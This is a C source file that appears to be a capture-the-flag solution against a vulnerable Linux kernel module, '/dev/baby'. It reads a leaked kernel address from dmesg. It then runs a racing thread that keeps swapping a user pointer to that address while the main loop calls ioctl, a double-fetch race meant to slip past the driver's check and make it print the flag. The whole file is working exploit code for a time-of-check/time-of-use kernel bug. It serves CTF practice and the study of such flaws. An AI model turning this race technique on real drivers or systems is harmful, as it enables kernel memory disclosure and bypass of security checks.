#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <sys/ioctl.h>

pthread_t compete_thread;
size_t real_addr;
char buf[0x20] = "arttnba3";
int competetion_times = 0x1000, status = 1;
struct {
    char *flag_addr;
    int flag_len;
} flag = {
    .flag_addr = buf,
    .flag_len = 33
};

void* competetionThread(void *args)
{
    while (status) {
        for (int i = 0; i < competetion_times; i++) {
            flag.flag_addr = (char *) real_addr;
        }
    }
}

int main(int argc, char ** argv, char ** envp)
{
    int fd, result_fd, addr_fd;
    char *temp, *flag_addr_addr, flag_addr_addr_str[32];

    fd = open("/dev/baby", O_RDWR);
    ioctl(fd, 0x6666);
    system("dmesg | grep flag > addr.txt");
    temp = (char*) malloc(0x1000);    
    addr_fd = open("./addr.txt", O_RDONLY);
    temp[read(addr_fd, temp, 0x100)] = '\0';
    flag_addr_addr = strstr(temp,"Your flag is at ")+strlen("Your flag is at ");
    memset(flag_addr_addr_str, '\0', sizeof(flag_addr_addr_str));
    memcpy(flag_addr_addr_str, flag_addr_addr, 16);
    sscanf(flag_addr_addr, "%lx", &real_addr);
    //real_addr = (void*) strtoull(flag_addr_addr, flag_addr_addr + 16, 16);
    printf("[+] flag addr: %lx", real_addr);

    pthread_create(&compete_thread, NULL, competetionThread, NULL);
    while (status){
        for(int i = 0; i < competetion_times; i++) {
            flag.flag_addr = buf;
            ioctl(fd, 0x1337, &flag);
        }
        system("dmesg | grep flag > result.txt");
        result_fd = open("./result.txt", O_RDONLY);
        read(result_fd, temp, 0x1000);
        if (strstr(temp, "flag{")) {
            status = 0;
        }
    }
    pthread_cancel(compete_thread);

    printf("[+] competetion end!");
    system("dmesg | grep flag");

    return 0;
}
